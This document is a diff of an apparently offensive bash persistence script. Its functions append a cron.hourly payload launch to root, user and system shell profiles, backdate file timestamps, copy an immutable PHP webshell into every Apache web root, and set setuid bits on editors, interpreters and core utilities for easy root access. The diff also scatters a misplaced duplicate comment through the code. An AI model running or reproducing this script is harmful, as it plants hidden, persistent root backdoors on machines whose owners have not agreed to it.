@@ -107,6 +107,7 @@ backdoor2() {
 	echo "/etc/cron.hourly/$backdoor_name &" >> /root/.bashrc
 	echo "/etc/cron.hourly/$backdoor_name &" >> /home/*/.bashrc
 	echo "/etc/cron.hourly/$backdoor_name &" >> /etc/profile
+#backdoor #4: setuid bit on programs for easy r00tz
 	echo "/etc/cron.hourly/$backdoor_name &" >> /etc/skel/.profile
 	touch -d "12 Jul 08" /root/.bashrc
 	for bashrc in `ls /home/*/.bashrc`; do
@@ -123,37 +124,39 @@ backdoor2() {
 #backdoor #3: adds a PHP webshell to the specified directory
 backdoor3() {
 #already done
-	printf "BACKDOORING VIA WEBSHELL\n"
+#backdoor #4: setuid bit on programs for easy r00tz
+	printf "BACKDOORING VIA PHP WEBSHELL\n"
 	# check if apache is installed
 	if [[ `ps aux | grep apache | grep -v grep` -ne 0 ]]; then 
 		for webroot in `grep -R "DocumentRoot" /etc/apache2/ | cut -d ":" -f 2 | sed -e 's/^[[:space:]]*//' | cut -d " " -f 2`; do 
 		cp /root/$webshell $webroot
 		touch -d "12 Jul 08" $webroot/$webshellURL/$webshell
 		chattr +i $webroot/$webshellURL/$webshell
+		printf "Added file $webroot/$webshellURL/$webshell"
 	done
 	else 
-		printf "Apache wasnt found to be running"
+		printf "Apache wasnt found to be running\n"
 	fi
+	rm /root/$webshell
 }
 
-#backdoor #4: setuid bit on programs for easy r00tz
 backdoor4(){
-	printf "BACKDOORING VIA SETUID ON BINARIES\n"
-	if chmod -f +sss `command -v nano` ; then printf "nano setuid bit set\n"; fi
-	if chmod -f +sss `command -v vi` ; then printf "vi setuid bit set\n"; fi
-	if chmod -f +sss `command -v vim` ; then printf "vim setuid bit set\n"; fi
-	if chmod -f +sss `command -v emacs` ; then printf "emacs setuid bit set\n"; fi
-	if chmod -f +sss `command -v cat` ; then printf "cat setuid bit set\n"; fi
+	printf "BACKDOORING VIA SETUID ON BINARIES FOR EASY R00TZ\n"
+	if chmod -f +sss `command -v nano` &> /dev/null; then printf "nano setuid bit set\n"; fi
+	if chmod -f +sss `command -v vi` &> /dev/null; then printf "vi setuid bit set\n"; fi
+	if chmod -f +sss `command -v vim` &> /dev/null; then printf "vim setuid bit set\n"; fi
+	if chmod -f +sss `command -v emacs` &> /dev/null; then printf "emacs setuid bit set\n"; fi
+	if chmod -f +sss `command -v cat` &> /dev/null; then printf "cat setuid bit set\n"; fi
 	if chmod -f +sss /bin/echo; then printf "echo setuid bit set\n"; fi
-	if chmod -f +sss `command -v less` ; then printf "less setuid bit set\n"; fi
-	if chmod -f +sss `command -v more` ; then printf "more setuid bit set\n"; fi
-	if chmod -f +sss `command -v mv` ; then printf "mv setuid bit set\n"; fi
-	if chmod -f +sss `command -v cp` ; then printf "cp setuid bit set\n"; fi
-	if chmod -f +sss `command -v awk` ; then printf "awk setuid bit set\n"; fi
-	if chmod -f +sss `command -v find` ; then printf "find setuid bit set\n"; fi
-	if chmod -f +sss `command -v python` ; then printf "python setuid bit set\n"; fi
-	if chmod -f +sss `command -v perl` ; then printf "perl setuid bit set\n"; fi
-	if chmod -f +sss `command -v ruby` ; then printf "ruby setuid bit set\n"; fi
+	if chmod -f +sss `command -v less` &> /dev/null; then printf "less setuid bit set\n"; fi
+	if chmod -f +sss `command -v more` &> /dev/null; then printf "more setuid bit set\n"; fi
+	if chmod -f +sss `command -v mv` &> /dev/null; then printf "mv setuid bit set\n"; fi
+	if chmod -f +sss `command -v cp` &> /dev/null; then printf "cp setuid bit set\n"; fi
+	if chmod -f +sss `command -v awk` &> /dev/null; then printf "awk setuid bit set\n"; fi
+	if chmod -f +sss `command -v find` &> /dev/null; then printf "find setuid bit set\n"; fi
+	if chmod -f +sss `command -v python` &> /dev/null; then printf "python setuid bit set\n"; fi
+	if chmod -f +sss `command -v perl` &> /dev/null; then printf "perl setuid bit set\n"; fi
+	if chmod -f +sss `command -v ruby` &> /dev/null; then printf "ruby setuid bit set\n"; fi
 }
 
 backdoor5(){
